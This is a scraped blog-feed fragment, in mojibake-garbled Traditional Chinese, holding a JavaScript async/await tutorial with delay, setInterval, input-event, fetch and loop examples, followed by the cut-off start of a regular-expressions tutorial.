asyncã€awaitï¼Œå¹«åŠ©æˆ‘å€‘å¯ä»¥æ›´å®¹æ˜“çš„é€²è¡Œç¨‹å¼é‚è¼¯çš„æ’°å¯«ã€‚\nå°æ–¼åŒæ­¥å’ŒéåŒæ­¥ï¼Œæœ€å¸¸è¦‹çš„èªªæ³•æ˜¯ã€ŒåŒæ­¥æ¨¡å¼ä¸‹ï¼Œæ¯å€‹ä»»å‹™å¿…é ˆæŒ‰ç…§é †åºåŸ·è¡Œï¼Œå¾Œé¢çš„ä»»å‹™å¿…é ˆç­‰å¾…å‰é¢çš„ä»»å‹™åŸ·è¡Œå®Œæˆï¼ŒéåŒæ­¥æ¨¡å¼å‰‡ç›¸åï¼Œå¾Œé¢çš„ä»»å‹™ä¸ç”¨ç­‰å‰é¢çš„ï¼Œå„è‡ªåŸ·è¡Œå„è‡ªçš„ä»»å‹™ã€ï¼Œä½†æˆ‘è¦ºå¾—é€™æ¨£å¯¦åœ¨ä¸å®¹æ˜“ç†è§£ï¼Œä¸å®¹æ˜“ç†è§£çš„åœ°æ–¹åœ¨æ–¼ã€Œä¸­æ–‡ã€çš„åŒæ­¥å’ŒéåŒæ­¥ï¼Œå¯èƒ½å’Œå¯¦éš›ä¸Šçš„è§£é‡‹å‰›å¥½ç›¸åäº† ( åŒæ­¥çš„ä¸­æ–‡å­—é¢æ„æ€æ˜¯ã€Œä¸€èµ·èµ°ã€ï¼ŒéåŒæ­¥çš„ä¸­æ–‡æ„æ€æ˜¯ã€Œä¸è¦ä¸€èµ·èµ°ã€ï¼Œè¶…å®¹æ˜“æéŒ¯çš„ )ï¼Œå› æ­¤å¦‚æœä½ è·Ÿæˆ‘ä¸€æ¨£ä¹Ÿå¾ˆå®¹æ˜“æéŒ¯ï¼Œå¯ä»¥ä½¿ç”¨æˆ‘è¦ºå¾—æ¯”è¼ƒå¥½ç†è§£çš„æ–¹æ³•ï¼šã€ŒåŒä¸€å€‹æ­¥é“ vs ä¸åŒæ­¥é“ã€ï¼Œé€éæ­¥é“çš„æ–¹å¼ï¼Œå°±æ›´å®¹æ˜“æ˜ç™½åŒæ­¥å’ŒéåŒæ­¥ã€‚\nåŒæ­¥ï¼šåœ¨ã€ŒåŒä¸€å€‹æ­¥é“ã€æ¯”è³½ã€Œæ¥åŠ›è³½è·‘ã€ï¼Œç•¶æ£’å­æ²’æœ‰äº¤çµ¦æˆ‘ï¼Œæˆ‘å°±å¾—ç­‰ä½ ï¼Œä¸èƒ½è·‘ã€‚\néåŒæ­¥ï¼šåœ¨ã€Œä¸ ( é ) åŒæ­¥é“ã€æ¯”è³½ã€Œè³½è·‘ã€ï¼Œèª°éƒ½ä¸ç­‰èª°ï¼Œåªè¦è¼ªåˆ°æˆ‘è·‘ï¼Œæˆ‘å°±é–‹å§‹è·‘ã€‚\nåœ¨ ES7 è£¡é ­ async çš„æœ¬è³ªæ˜¯ promise çš„èªæ³•ç³– ( åŒ…è£å¾—ç”œç”œçš„æ¯”è¼ƒå¥½åƒä¸‹è‚š )ï¼Œåªè¦ function æ¨™è¨˜ç‚º asyncï¼Œå°±è¡¨ç¤ºè£¡é ­å¯ä»¥æ’°å¯« await çš„åŒæ­¥èªæ³•ï¼Œè€Œ await é¡§åæ€ç¾©å°±æ˜¯ã€Œç­‰å¾…ã€ï¼Œå®ƒæœƒç¢ºä¿ä¸€å€‹ promise ç‰©ä»¶éƒ½è§£æ±º ( resolve ) æˆ–å‡ºéŒ¯ ( reject ) å¾Œæ‰æœƒé€²è¡Œä¸‹ä¸€æ­¥ï¼Œç•¶ async function çš„å…§å®¹å…¨éƒ½çµæŸå¾Œï¼Œæœƒè¿”å›ä¸€å€‹ promiseï¼Œé€™è¡¨ç¤ºå¾Œæ–¹å¯ä»¥ä½¿ç”¨.thenèªæ³•ä¾†åšé€£æ¥ï¼ŒåŸºæœ¬çš„ç¨‹å¼é•·ç›¸å°±åƒä¸‹é¢é€™æ¨£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 async function a(){ await b(); ..... // ç­‰ b() å®Œæˆå¾Œæ‰æœƒåŸ·è¡Œ await c(); ..... // ç­‰ c() å®Œæˆå¾Œæ‰æœƒåŸ·è¡Œ await new Promise(resolve=\u0026gt;{ ..... }); ..... // ä¸Šæ–¹çš„ promise å®Œæˆå¾Œæ‰æœƒåŸ·è¡Œ } a(); a().then(()=\u0026gt;{ ..... // ç­‰ a() å®Œæˆå¾Œæ¥è‘—åŸ·è¡Œ }); åˆ©ç”¨ async å’Œ await åšå€‹ã€Œæ¼‚äº®çš„ç­‰å¾…ã€ æ¯”è¼ƒäº†è§£ async å’Œ await çš„æ„æ€ä¹‹å¾Œï¼Œå°±ä¾†è©¦è©¦çœ‹åšå€‹ã€Œæ¼‚äº®çš„ç­‰å¾…ã€ï¼Œéå»æœ‰ä½¿ç”¨ ES6 çš„ promise ä¾†å¯¦ç¾ delay ( å¦‚åŒä¸‹æ–¹çš„ç¨‹å¼ç¯„ä¾‹ )ï¼Œé€™å€‹ delay é€é.thenä¾†å®Œæˆä¸€æ­¥ä¸€æ­¥çš„ä¸²æ¥ï¼Œé›–ç„¶é‚è¼¯ä¸Šå¾ˆæ¸…æ¥šï¼Œä½†è‹¥è¦å¯¦ä½œæ¯”è¼ƒè¤‡é›œçš„æµç¨‹ï¼Œå°±å¾—æŠŠæ¯å€‹ç¨‹å¼å¯«åœ¨å°æ‡‰çš„ callback è£ï¼Œä¹Ÿå°±æ²’æœ‰æƒ³åƒçš„å®¹æ˜“ï¼Œé€™å°±æ˜¯ã€Œä¸å¤ªæ¼‚äº®çš„ç­‰å¾…ã€ ( ä½¿ç”¨ setTimeout çš„åšæ³•å°±æ˜¯ä¸æ¼‚äº®çš„ç­‰å¾… )ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // ä¸æ¼‚äº®çš„ç­‰å¾… const delay = (s) =\u0026gt; { return new Promise(resolve =\u0026gt; { setTimeout(resolve,s); }); }; delay().then(() =\u0026gt; { console.log(1); // é¡¯ç¤º 1 return delay(1000); // å»¶é²ã„§ç§’ }).then(() =\u0026gt; { console.log(2); // é¡¯ç¤º 2 return delay(2000); // å»¶é²äºŒç§’ }).then(() =\u0026gt; { console.log(3); // é¡¯ç¤º 3 }); å¦‚æœæˆ‘å€‘æŠŠä¸Šé¢çš„ç¯„ä¾‹ä¿®æ”¹ç‚º async å’Œ await çš„å¯«æ³•ï¼Œçªç„¶å°±ç™¼ç¾ç¨‹å¼ç¢¼çœ‹èµ·ä¾†éå¸¸çš„ä¹¾æ·¨ï¼Œå› ç‚º await æœƒç­‰å¾…æ”¶åˆ° resolve ä¹‹å¾Œæ‰æœƒé€²è¡Œå¾Œé¢çš„å‹•ä½œï¼Œå¦‚æœæ²’æœ‰æ”¶åˆ°å°±æœƒä¸€ç›´è™•åœ¨ç­‰å¾…çš„ç‹€æ…‹ï¼Œæ‰€ä»¥ä»€éº¼æ™‚å€™è©²ç­‰å¾…ï¼Œä»€éº¼æ™‚å€™è©²åšä¸‹ä¸€æ­¥ï¼Œå°±æœƒéå¸¸æ¸…æ¥šæ˜ç­ï¼Œé€™ä¹Ÿå°±æ˜¯æˆ‘æ‰€è¬‚ã€Œæ¼‚äº®çš„ç­‰å¾…ã€ã€‚\næ³¨æ„ï¼Œawait ä¸€å®šå¾—é‹è¡Œåœ¨ async function å…§ï¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 ~async function{ // ~ é–‹é ­è¡¨ç¤ºç›´æ¥åŸ·è¡Œé€™å€‹ functionï¼Œçµå°¾æœ‰ () const delay = (s) =\u0026gt; { return new Promise(function(resolve){ // å›å‚³ä¸€å€‹ promise setTimeout(resolve,s); // ç­‰å¾…å¤šå°‘ç§’ä¹‹å¾Œ resolve() }); }; console.log(1); // é¡¯ç¤º 1 await delay(1000); // å»¶é²ã„§ç§’ console.log(2); // é¡¯ç¤º 2 await delay(2000); // å»¶é²äºŒç§’ console.log(3); // é¡¯ç¤º 3 }(); æ­é… Promise åŸºæœ¬ä¸Šåªè¦æœ‰ async å’Œ await çš„åœ°æ–¹ï¼Œå°±ä¸€å®šæœ‰ promise çš„å­˜åœ¨ï¼Œpromise é¡§åæ€ç¾©å°±æ˜¯ã€Œä¿è­‰åŸ·è¡Œä¹‹å¾Œæ‰æœƒåšä»€éº¼äº‹æƒ…ã€ï¼Œå‰›å‰›ä½¿ç”¨äº† asyncã€await å’Œ promise æ”¹å–„setTimeouté€™å€‹å®¹æ˜“å‡ºéŒ¯çš„éåŒæ­¥ç­‰å¾…ï¼Œé‡å°setIntervalï¼Œä¹Ÿèƒ½ç”¨åŒæ¨£çš„åšæ³•ä¿®æ”¹ï¼Œèˆ‰ä¾‹ä¾†èªªï¼Œä¸‹é¢çš„ç¨‹å¼ç¢¼åŸ·è¡Œä¹‹å¾Œï¼Œä¸¦ã€Œä¸æœƒã€å¦‚æˆ‘å€‘é æœŸçš„ã€Œå…ˆé¡¯ç¤º 1ï¼Œå†é¡¯ç¤º haha0\u0026hellip;haha5ï¼Œæœ€å¾Œå†é¡¯ç¤º 2ã€ï¼Œè€Œæ˜¯ã€Œå…ˆé¡¯ç¤º 1 å’Œ 2ï¼Œç„¶å¾Œå†å‡ºç¾ haha0\u0026hellip;haha5ã€ï¼Œå› ç‚ºé›–ç„¶ç¨‹å¼é‚è¼¯æ˜¯å¾ä¸Šå¾€ä¸‹ï¼Œä½†åœ¨ count function è£é ­æ˜¯éåŒæ­¥çš„èªæ³•ï¼Œå°è‡´è‡ªå·±èµ°è‡ªå·±çš„è·¯ï¼Œä¹Ÿé€ æˆäº†çµæœçš„ä¸å¦‚é æœŸã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 const count = (t,s) =\u0026gt; { let a = 0; let timer = setInterval(() =\u0026gt; { console.log(`${t}${a}`); a = a + 1; if(a\u0026gt;5){ clearInterval(timer); } },s); }; console.log(1); count(\u0026#39;haha\u0026#39;, 100); console.log(2); é€™æ™‚æˆ‘å€‘å¯ä»¥é€é asyncã€await å’Œ promise é€²è¡Œä¿®æ­£ï¼Œåœ¨é¡¯ç¤º 1 ä¹‹å¾Œï¼Œæœƒã€Œç­‰å¾…ã€count function çµæŸå¾Œå†é¡¯ç¤º 2ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ~async function(){ const count = (t,s) =\u0026gt; { return new Promise(resolve =\u0026gt; { let a = 0; let timer = setInterval(() =\u0026gt; { console.log(`${t}${a}`); a = a + 1; if(a\u0026gt;5){ clearInterval(timer); resolve(); // è¡¨ç¤ºå®Œæˆ } },s); }); }; console.log(1); await count(\u0026#39;haha\u0026#39;, 100); console.log(2); }(); é™¤äº†setTimeoutå’ŒsetIntervalï¼Œé€™ä¹Ÿå¯ä»¥ç”¨æ–¼åƒæ˜¯ã€Œè¼¸å…¥æ–‡å­—ã€çš„æƒ…å¢ƒï¼Œéå»æˆ‘å€‘è¦åšåˆ°ã€Œé€£çºŒè¼¸å…¥ã€æ–‡å­—ï¼Œå¯èƒ½è¦å±¤å±¤ç–Šç–Šå¯«å€‹å¥½å¹¾å€‹ callbackï¼Œç¾åœ¨å¦‚æœä½¿ç”¨ async å’Œ awaitï¼Œå°±èƒ½å¤ å¾ˆç°¡å–®çš„å¯¦ç¾é€£çºŒè¼¸å…¥çš„æƒ…å¢ƒï¼Œç¨‹å¼ç¢¼çœ‹èµ·ä¾†ä¹Ÿæ›´ä¹¾æ·¨ç°¡æ½”ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // HTML ç‚ºä¸€å€‹è¼¸å…¥æ¡†ã€ä¸€å€‹æŒ‰éˆ•å’Œä¸€å€‹ h1 æ¨™ç±¤ // \u0026lt;input id=\u0026#34;a\u0026#34;\u0026gt;\u0026lt;/input\u0026gt;\u0026lt;button id=\u0026#34;b\u0026#34;\u0026gt;send\u0026lt;/button\u0026gt; // \u0026lt;h1 id=\u0026#34;h\u0026#34;\u0026gt;\u0026lt;/h1\u0026gt; ~async function(){ const input = () =\u0026gt; { return new Promise(resolve =\u0026gt;{ const btnClick = () =\u0026gt;{ h.insertAdjacentHTML(\u0026#39;beforeend\u0026#39;, a.value + \u0026#39;\u0026lt;br/\u0026gt;\u0026#39;); // è¼¸å…¥å¾Œåœ¨ h1 è£¡æ·»åŠ å…§å®¹ a.value = \u0026#39;\u0026#39;; // æ¸…ç©ºè¼¸å…¥æ¡† a.focus(); // å°‡ç„¦é»ç§»è‡³è¼¸å…¥æ¡† b.removeEventListener(\u0026#39;click\u0026#39;, btnClick); // removeEventListener é¿å…é‡è¤‡ç¶å®šäº‹ä»¶ resolve(); // å®Œæˆ }; b.addEventListener(\u0026#39;click\u0026#39;, btnClick); // ç¶å®šæŒ‰éˆ•äº‹ä»¶ }); }; h.insertAdjacentHTML(\u0026#39;beforeend\u0026#39;, \u0026#39;é–‹å§‹\u0026lt;br/\u0026gt;\u0026#39;); await input(); // ç­‰å¾…è¼¸å…¥ï¼Œè¼¸å…¥å¾Œæ‰æœƒé€²è¡Œä¸‹ä¸€æ­¥ await input(); await input(); h.insertAdjacentHTML(\u0026#39;beforeend\u0026#39;, \u0026#39;çµæŸ\u0026#39;); }(); æ­é… Fetch åœ¨æˆ‘ä¹‹å‰çš„æ–‡ç«  JavaScript Fetch API ä½¿ç”¨æ•™å­¸ å·²ç¶“æœ‰æåˆ°fetchçš„ç”¨æ³•ï¼Œå› ç‚ºfetchæœ€å¾Œå›å‚³çš„æ˜¯ promiseï¼Œç†æ‰€ç•¶ç„¶çš„é€é async å’Œ await æ“ä½œæ˜¯æœ€æ°ç•¶ä¸éçš„ã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œå…ˆå‰å¾€ ä¸­å¤®æ°£è±¡å±€é–‹æ”¾è³‡æ–™å¹³å° å¯ä»¥å–å¾—è¨±å¤šæ°£è±¡è³‡æ–™ï¼Œæ‰¾åˆ° å±€å±¬æ°£è±¡ç«™-ç¾åœ¨å¤©æ°£è§€æ¸¬å ±å‘Š ï¼Œè¤‡è£½ JSON æ ¼å¼çš„é€£çµ ( éœ€è¦è¨»å†Šç™»å…¥æ‰èƒ½çœ‹å¾—åˆ°é€£çµ )ï¼Œé€éfetchçš„json()æ–¹æ³•è™•ç†æª”æ¡ˆï¼Œç›®æ¨™é¡¯ç¤ºå‡ºã€Œé«˜é›„å¸‚çš„å³æ™‚æ°£æº«ã€ã€‚\né€é async å’Œ await çš„ç¾åŒ–ç¨‹å¼ç¢¼ï¼Œå¾—åˆ°çš„çµæœå®Œå…¨ä¸éœ€è¦ callback çš„è¼”åŠ©ï¼Œå°±èƒ½æŒ‰ç…§æˆ‘å€‘æ‰€æœŸæœ›çš„é †åºé€²è¡Œã€‚(å…ˆé¡¯ç¤ºã€Œé–‹å§‹æŠ“æ°£è±¡ã€ï¼Œæ¥è‘—é¡¯ç¤ºã€Œé«˜é›„å¸‚çš„æ°£æº«ã€ï¼Œæœ€å¾Œé¡¯ç¤ºã€Œç¸½ç®—çµæŸäº†ã€)\n1 2 3 4 5 6 7 8 9 10 11 12 ~async function(){ console.log(\u0026#39;é–‹å§‹æŠ“æ°£è±¡\u0026#39;); // å…ˆé¡¯ç¤ºã€Œé–‹å§‹æŠ“æ°£è±¡ã€ await fetch(\u0026#39;æ°£è±¡å±€ json ç¶²å€\u0026#39;) // å¸¶æœ‰ await çš„ fetch .then(res =\u0026gt; { return res.json(); }).then(result =\u0026gt; { let city = result.cwbopendata.location[14].parameter[0].parameterValue; let temp = result.cwbopendata.location[14].weatherElement[3].elementValue.value; console.log(`${city}çš„æ°£æº«ç‚º ${temp} åº¦ C`); }); console.log(\u0026#39;ç¸½ç®—çµæŸäº†\u0026#39;); // æŠ“å®Œæ°£è±¡ä¹‹å¾Œå†é¡¯ç¤ºã€Œç¸½ç®—çµæŸäº†ã€ }(); æ­é… è¿´åœˆ å¦‚æœè¦é€é JavaScript å¯¦ç¾ã€Œæ–‡å­—æ…¢æ…¢è®Šå¤§ã€çš„æ•ˆæœï¼Œé™¤äº†é€é CSS çš„ transition è¨­å®šä¹‹å¤–ï¼Œé€šå¸¸å°±æ˜¯ç›´æ¥ä½¿ç”¨setIntervalä¾†å®Œæˆï¼Œå°±åƒä¸‹é¢çš„ç¨‹å¼ç¢¼é€™æ¨£ï¼š\n1 2 3 4 5 6 7 8 9 let size = 30; h.style.lineHeight = 0; const timer = setInterval(()=\u0026gt;{ h.style.fontSize = size + \u0026#39;px\u0026#39;; size = size + 1; if(size \u0026gt;= 130){ clearInterval(timer); } },10); å¦‚æœæ­é… async å’Œ awaitï¼Œæˆ‘å€‘å°±èƒ½å°‡åŒæ¨£çš„åšæ³•ï¼Œæ”¹ç”±ã€Œè¿´åœˆã€å¯¦ç¾ï¼Œå› ç‚ºä½¿ç”¨äº† awaitï¼Œæ‰€ä»¥è¿´åœˆæ¯æ¬¡åŸ·è¡Œæ™‚ï¼Œéƒ½æœƒé€²è¡Œã€Œç­‰å¾…ã€ï¼Œä¹Ÿå°±èƒ½åšåˆ°å­—é«”æ…¢æ…¢è®Šå¤§çš„æ•ˆæœã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // HTML ç‚ºä¸€å€‹ h1 æ¨™ç±¤ \u0026lt;h1 id=\u0026#34;h\u0026#34;\u0026gt;hello\u0026lt;/h1\u0026gt; ~async function(){ const delay = t =\u0026gt; { // å…ˆæ’°å¯«ä¸€å€‹ç­‰å¾…çš„ function return new Promise(resolve =\u0026gt; { setTimeout(resolve, t); }); }; h.style.linHeight = 0; for(let i=30; i\u0026lt;130; i++){ h.style.fontSize = i + \u0026#39;px\u0026#39;; await delay(10); // è¿´åœˆæ¯æ¬¡åŸ·è¡Œæ™‚ï¼Œéƒ½æœƒåœ¨é€™è£¡ç­‰å¾… 10ms } }(); åŒæ¨£çš„ï¼Œä¸Šé¢æåˆ°çš„ fetch æˆ–æ˜¯è¼¸å…¥æ–‡å­—ï¼Œåªè¦åšæˆ await çš„æ–¹å¼ï¼Œéƒ½å¯ä»¥æ”¾åœ¨è¿´åœˆè£¡é¢ä½¿ç”¨ï¼Œä¾‹å¦‚é€éè¿´åœˆä¸æ–·çš„ fetch è³‡æ–™ã€é€éè¿´åœˆä¸æ–·çš„è¼¸å…¥æ–‡å­—\u0026hellip;ç­‰ï¼Œé€™äº›å°±ä¸æ˜¯ callback æ–¹æ³•èƒ½å®¹æ˜“è¾¦åˆ°çš„å›‰\nå°çµ å¦ç™½èªªåªè¦ä½ ä¸€ä½†ç†Ÿæ‚‰äº† async å’Œ awaitï¼Œå°±çœŸçš„å›ä¸å»äº†ï¼Œé›–ç„¶èªª callback ä»ç„¶æ˜¯ç¨‹å¼é–‹ç™¼è£¡å¿…å‚™çš„åŠŸèƒ½ï¼Œä½†å°æ–¼åŒæ­¥å’ŒéåŒæ­¥ä¹‹é–“çš„è½‰æ›ï¼Œä»¥å¾Œå°±äº¤çµ¦ async å’Œ await ä¾†è™•ç†å§ï¼\n","date":"2022-08-13T00:00:00Z","image":"https://live.staticflickr.com/65535/52281246237_dd06bc8ef9_o.png","permalink":"https://wayneblog.ga/2022-08-13/js-async-await/","title":"Javascript çš„ Async/Await"},{"content":" åƒè€ƒç¶²ç«™\nå»ºç«‹æ­£è¦å¼ æ­£å‰‡è¡¨é”å¼çš„è¦å‰‡ç¨±ä½œ patternã€‚åœ¨ JavaScript ä¸­å¯ä»¥é€é Regular expression literals çš„æ–¹å¼æˆ–å»ºæ§‹å¼çš„æ–¹å¼ä¾†å»ºç«‹ regular expressions patternï¼š\næ–¹æ³•ä¸€ï¼šRegular expression literals script è¼‰å…¥æ™‚å³ç·¨è­¯ï¼Œç•¶ pattern ä¸æœƒæ”¹è®Šæ™‚ï¼Œä½¿ç”¨æ­¤æ–¹å¼å®šç¾© pattern æ•ˆèƒ½è¼ƒå¥½ã€‚ 1 var re = /ab+c/; æ–¹æ³•äºŒï¼šFunction Constructor ç¨‹å¼åŸ·è¡Œéç¨‹æ‰æœƒè¢«ç·¨è­¯ï¼Œæ•ˆèƒ½è¼ƒå·®ï¼Œé©åˆç”¨åœ¨ regular expression pattern å¯èƒ½æœƒæ”¹è®Šæ™‚ä½¿ç”¨ã€‚ 1 2 var re = new RegExp(\u0026#39;ab+c\u0026#39;); var myRe = new RegExp(\u0026#39;d(b+)d\u0026#39;, \u0026#39;g\u0026#39;); Regular expression literals æ•ˆèƒ½è¼ƒå¥½ï¼Œé©åˆ pattern ä¸æœƒæ”¹è®Šçš„æƒ…æ³ï¼›\nFunction Constructor æ•ˆèƒ½è¼ƒå·®ï¼Œé©åˆç”¨åœ¨ pattern å¯èƒ½å‹•æ…‹æ”¹è®Šçš„æƒ…æ³ã€‚\nä½¿ç”¨æ­£è¦å¼ åœ¨ JavaScript ä¸­å¯ä»¥ä½¿ç”¨æ­£è¦å¼çš„å‡½å¼åŒ…å«ï¼š\nRegExp.prototype.test()ï¼šæœå°‹å­—ä¸²ä¸­æ˜¯å¦æœ‰ç¬¦åˆçš„éƒ¨åˆ†ï¼Œå›å‚³ true/falseã€‚ RegExp.prototype.exec()ï¼šä»¥é™£åˆ—å›å‚³å­—ä¸²ä¸­åŒ¹é…åˆ°çš„éƒ¨åˆ†ï¼Œå¦å‰‡å›å‚³ nullã€‚ String.prototype.match()ï¼šä»¥é™£åˆ—å›å‚³å­—ä¸²ä¸­åŒ¹é…åˆ°çš„éƒ¨åˆ†ï¼Œå¦å‰‡å›å‚³ nullã€‚ String.prototype.replace()ï¼šå°‹æ‰¾å­—ä¸²ä¸­åŒ¹é…çš„éƒ¨åˆ†ï¼Œä¸¦å–ä»£ä¹‹ã€‚ String.prototype.search()ï¼šå°‹æ‰¾å­—ä¸²ä¸­æ˜¯å¦æœ‰ç¬¦åˆçš„éƒ¨åˆ†ï¼Œæœ‰çš„è©±å›å‚³ indexï¼Œå¦å‰‡å›å‚³ -1ã€‚ String.prototype.split()ï¼šåœ¨å­—ä¸²æ ¹æ“šåŒ¹é…åˆ°çš„é …ç›®æ‹†æˆé™£åˆ—ã€‚ ç°¡å–®ä¾†èªªï¼Œç•¶ä½ æƒ³è¦çœ‹å­—ä¸²æ˜¯å¦åŒ…å«æŸ pattern æ™‚ï¼Œä½¿ç”¨ test æˆ– searchï¼›\næƒ³è¦æ›´å¤šçš„è³‡è¨Šï¼ˆèŠ±è¼ƒå¤šè€—æ•ˆèƒ½ï¼‰ï¼Œå‰‡ä½¿ç”¨ exec æˆ– matchã€‚\nç‰¹æ®Šå­—å…ƒ (character) æ¨™ç±¤ï¼ˆflagï¼‰ 1 2 3 regex = /hello/; // å€åˆ†å¤§å°å¯«ï¼ŒåŒ¹é… \u0026#34;hello\u0026#34;, \u0026#34;hello123\u0026#34;, \u0026#34;123hello123\u0026#34;, \u0026#34;123hello\u0026#34;ï¼Œä½†ä¸åŒ¹é… \u0026#34;hell0\u0026#34;, \u0026#34;Hello\u0026#34; regex = /hello/i; // ä¸å€åˆ†å¤§å°å¯«ï¼ŒåŒ¹é… \u0026#34;hello\u0026#34;, \u0026#34;HelLo\u0026#34;, \u0026#34;123HelLO\u0026#34; regex = /hello/g; // å…¨åŸŸæœå°‹ ES 2019 æ–°å¢ /s çš„æ¨™ç±¤ï¼Œéå» . å¯ä»¥ç”¨ä¾†åŒ¹é…é™¤äº†æ›è¡Œç¬¦è™Ÿä»¥å¤–ï¼ˆ\\n, \\rï¼‰çš„æ‰€æœ‰å­—å…ƒï¼š\n1 2 3 // éå» . å¯ä»¥åŒ¹é…åˆ°é™¤äº†ã€Œæ›è¡Œç¬¦è™Ÿã€ä»¥å¤–çš„æ‰€æœ‰å­—å…ƒ console.log(/./.test(\u0026#39;\\n\u0026#39;)); // â†’ false console.log(/./.test(\u0026#39;\\r\u0026#39;)); // â†’ false éå»é›–ç„¶å¯ä»¥ä½¿ç”¨ [\\w\\W] ä¾†åŒ¹é…åˆ°æ›è¡Œç¬¦è™Ÿï¼Œä½†é€™ä¸æ˜¯æœ€å¥½çš„åšæ³•ï¼š\n1 2 console.log(/[\\w\\W]/.test(\u0026#39;\\n\u0026#39;)); // â†’ true console.log(/[\\w\\W]/.test(\u0026#39;\\r\u0026#39;)); // â†’ true åœ¨ ES 2019 ä¸­ï¼Œåªè¦æœ€å¾Œæœ‰æ¨™è¨˜ /s çš„æ¨™ç±¤ï¼Œå¦‚æ­¤ . å°‡ä¹Ÿèƒ½å¤ åŒ¹é…åˆ°æ›è¡Œç¬¦è™Ÿï¼š\n1 2 console.log(/./s.test(\u0026#39;\\n\u0026#39;)); // â†’ true console.log(/./s.test(\u0026#39;\\r\u0026#39;)); // â†’ true æ™®é€šå­—å…ƒ // 1 2 var regex = /a/; var regex = /is/; åæ–œç·š \\ 1 2 3 4 5 6 /* åœ¨ã€Œéã€ç‰¹æ®Šå­—å…ƒå‰é¢ä½¿ç”¨åæ–œç·šæ™‚ï¼Œè¡¨ç¤ºè¦æŠŠåæ–œç·šå¾Œçš„å­—ç•¶ä½œæ˜¯ç‰¹æ®Šå­—å…ƒ */ var regex = /\\b/; // b åŸæœ¬ä¸æ˜¯ç‰¹æ®Šå­—å…ƒï¼Œé€™å€‹ b è¦ç•¶æˆç‰¹æ®Šå­—å…ƒ /* åœ¨ç‰¹æ®Šå­—å…ƒå‰é¢ä½¿ç”¨åæ–œç·šæ™‚ï¼Œè¡¨ç¤ºè¦æŠŠåæ–œç·šå¾Œçš„å­—ç•¶ä½œæ˜¯ã€Œéã€ç‰¹æ®Šå­—å…ƒ */ var regex = /if\\(true/; // ( åŸæœ¬æ˜¯ç‰¹æ®Šå­—å…ƒï¼Œä½†é€™è£¡è¦ç•¶æˆéç‰¹æ®Šå­—å…ƒ var regex = /1\\+2=3/; // + åŸæœ¬æ˜¯ç‰¹æ®Šå­—å…ƒï¼Œä½†é€™è£¡è¦ç•¶æˆéç‰¹æ®Šå­—å…ƒ ä»»æ„ä¸€å€‹å­—å…ƒ . å¯ä»¥ç”¨ä¾†åŒ¹é…é™¤äº†æ›è¡Œç¬¦è™Ÿï¼ˆ\\nï¼‰ä»¥å¤–çš„æ‰€æœ‰å­—å…ƒï¼š 1 2 3 var regex = /a.man/; // a*man éƒ½æœƒ matchï¼Œä¾‹å¦‚ \u0026#34;acman\u0026#34;, \u0026#34;awman\u0026#34;, ä½† \u0026#34;a\\nman\u0026#34; ç„¡æ³•åŒ¹é…ã€‚ var regex = /.a/; // ä»»ä½•ä¸€å€‹å­—å…ƒå¾ŒåŠ ä¸Š a å¤šå€‹å­—å…ƒ [] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // å°å¯« a æˆ–å¤§å¯« A var regex = /[aA]/; // åŒ¹é…æ‰€æœ‰ä¸æ˜¯ a æˆ– A çš„å­— var regex = /[^aA]/; // a, e, i, o, u éƒ½æœƒ match var regex = /[aeiou]/; // è‹±æ–‡å­—æ¯ var regex = /[a-z]/; // æ‰€æœ‰å°å¯«çš„å­—æ¯ï¼Œå¾å°å¯« a åˆ°å°å¯« z var regex = /[A-Z]/; // æ‰€æœ‰å¤§å¯«çš„å­—æ¯ï¼Œå¾å¤§å¯« A åˆ°å¤§å¯« Z var regex = /[a-zA-Z]/; // æ‰€æœ‰è‹±æ–‡å­—æ¯ // æ•¸å­— 5 ~ 8 var regex = /[5-8]/; æ‹¬è™Ÿ () å¥—ç”¨åˆ°æ‰€æœ‰ 1 2 3 var regex = /^a|^the|^an/; // å¥—ç”¨åˆ°è£¡é¢æ‰€æœ‰çš„ var regex = /^(a|the|an)/; // ç­‰åŒæ–¼ ä¸æ˜¯ï¼ˆé™¤äº†ï¼‰ ^ 1 2 3 4 5 /* ä¸æ˜¯ a éƒ½æœƒ match */ var regex = /[^a]/; /* ä¸æ˜¯æ•¸å­—éƒ½æœƒ match */ var regex = /[^0-9]/; å¤šå€‹å­—å…ƒç¸®å¯« keywordsï¼š\\dã€\\wã€\\sã€\\bã€\\Dã€\\Wã€\\S \\d : digitï¼Œ[0-9] \\w : wordï¼ŒåŒ…å«è‹±æ–‡å¤§å°å¯«ã€æ•¸å­—ã€åº•ç·šï¼Œ[A-Za-z0-9_] \\s : spaceï¼ŒåŒ…å« space, tab, form feed, line feedï¼Œ[\\f\\n\\r\\t\\v\\u00a0\\u1680\\u2000-\\u200a\\u2028\\u2029\\u202f\\u205f\\u3000\\ufeff] \\D : ä¸æ˜¯ digitï¼Œç­‰åŒæ–¼ [^\\d] \\W : ä¸æ˜¯ wordï¼Œç­‰åŒæ–¼ [^\\w] \\S : ä¸æ˜¯ spaceï¼Œç­‰åŒæ–¼ [^\\s] 1 2 3 4 5 6 7 8 9 10 /* æ‰€æœ‰ word + e */ var regex = /\\we/; /* é€£çºŒå…©å€‹ä»»æ„çš„æ•¸å€¼ */ var regex = /\\d\\d/; /* å¥å­ä¸­çµå°¾ç‚º s çš„å–®å­— */ var regex = /s\\b/; var regex = /\\b[a-z]/g; // å¥å­ä¸­å„å€‹å–®å­—çš„ç¬¬ä¸€å€‹å­—æ¯ å…¶ä»–ç‰¹æ®Šå­—å…ƒï¼š \\t : tab \\b : word boundaryï¼Œç”¨ä¾†æ¯”å°å–®å­—å’Œå–®å­—é–“çš„ç©ºç™½ï¼Œ/s\\b/ å‰‡æœƒæ¯”å°å¥å­ä¸­æœ€ä¸€å€‹å­—æ¯æ˜¯ s çš„å–®å­— Word boundary \\bã€\\B é€é \\b å¯ä»¥é…å° word boundaryï¼Œword boundary 